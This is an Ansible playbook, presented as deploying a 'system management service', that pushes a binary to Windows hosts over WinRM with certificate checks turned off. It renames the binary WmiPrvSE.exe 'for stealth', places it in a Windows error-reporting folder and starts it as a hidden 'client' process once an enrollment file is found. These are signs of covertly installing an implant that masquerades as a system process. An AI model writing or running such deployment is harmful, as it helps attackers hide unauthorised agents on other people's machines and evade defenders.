---
- name: Deploy and Enroll System Management Service
  hosts: windows_targets
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    
    target_dir: 'C:\ProgramData\Microsoft\Windows\WER'

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    - name: Drop the binary (renamed for stealth)
      ansible.windows.win_copy:
        src: "files/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Check for enrollment and launch if found
      ansible.windows.win_shell: >
        $stateFile = Get-ChildItem -Path "C:\Users" -Filter "state.json" -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName -First 1;
        if ($stateFile) {
            Write-Host "[+] Agent is enrolled at $stateFile. Launching in background...";
            Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
        } else {
            Write-Host "[-] Agent is not enrolled yet. Skipping background launch."
        }
      register: launch_result

    - name: Show result
      debug:
        msg: "{{ launch_result.stdout }}"
